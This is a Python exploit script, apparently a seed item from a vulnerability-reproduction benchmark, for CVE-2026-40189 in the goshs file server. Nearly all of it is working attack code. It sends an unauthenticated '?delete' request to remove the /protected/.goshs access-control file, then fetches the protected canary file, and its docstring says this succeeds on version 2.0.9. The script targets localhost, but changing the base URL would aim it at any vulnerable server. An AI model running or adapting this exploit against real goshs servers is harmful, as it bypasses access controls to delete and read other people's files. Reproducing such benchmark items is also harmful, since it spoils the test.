#!/usr/bin/env python3
"""[GIVEN] CVE-2026-40189 seed exploit for goshs-cve-2026-54719.

State-changing routes (?delete) bypass the per-folder .goshs ACL. The exploit
(1) deletes /protected/.goshs unauthenticated, then (2) reads the protected
canary file normally.

Reaches the flag on v0 (2.0.9); BLOCKED on v1 (2.1.0, CVE-2026-40189 fixed).
"""
from urllib.request import urlopen, Request


def candidate(*, base="http://127.0.0.1:55131"):
    out = {}
    # 1) unauthenticated delete of the ACL file
    try:
        with urlopen(Request(base + "/protected/.goshs?delete", method="GET"), timeout=10) as r:
            out["delete_status"] = r.status
    except Exception as e:
        out["delete_status"] = getattr(e, "code", None)
    # 2) read the previously protected canary
    try:
        with urlopen(Request(base + "/protected/canary.txt", method="GET"), timeout=10) as r:
            out["status"] = r.status
            out["body"] = r.read().decode("utf-8", "replace")
    except Exception as e:
        out["status"] = getattr(e, "code", None)
        out["body"] = ""
    return out


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
